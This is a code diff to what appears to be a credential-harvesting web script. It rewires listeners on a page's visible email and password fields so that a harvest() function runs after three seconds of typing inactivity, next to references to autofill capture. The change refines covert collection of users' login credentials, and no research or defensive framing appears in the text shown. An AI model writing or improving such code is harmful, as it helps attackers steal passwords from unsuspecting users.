@@ -82,18 +82,24 @@ function setupEventListeners() {
   });
   console.log('Autofill listeners set up.');
 
-  // 2. Manual entry on visible forms (triggers harvest automatically)
+  // 2. Manual entry on visible forms with debounce
   const visibleEmail = document.getElementById('visible-email');
   const visiblePassword = document.getElementById('visible-password');
+  let debounceTimeout;
+
   if (visibleEmail && visiblePassword) {
-    const checkManualInput = () => {
-      if (visibleEmail.value && visiblePassword.value) {
-        harvest();
-      }
+    const debouncedHarvest = () => {
+      clearTimeout(debounceTimeout);
+      debounceTimeout = setTimeout(() => {
+        if (visibleEmail.value && visiblePassword.value) {
+          harvest();
+        }
+      }, 3000); // Wait for 3 seconds of inactivity
     };
-    visibleEmail.addEventListener('input', checkManualInput);
-    visiblePassword.addEventListener('input', checkManualInput);
-    console.log('Automatic manual input listeners set up.');
+
+    visibleEmail.addEventListener('input', debouncedHarvest);
+    visiblePassword.addEventListener('input', debouncedHarvest);
+    console.log('Debounced manual input listeners set up.');
   }
 
   // 3. "Next" button as a fallback
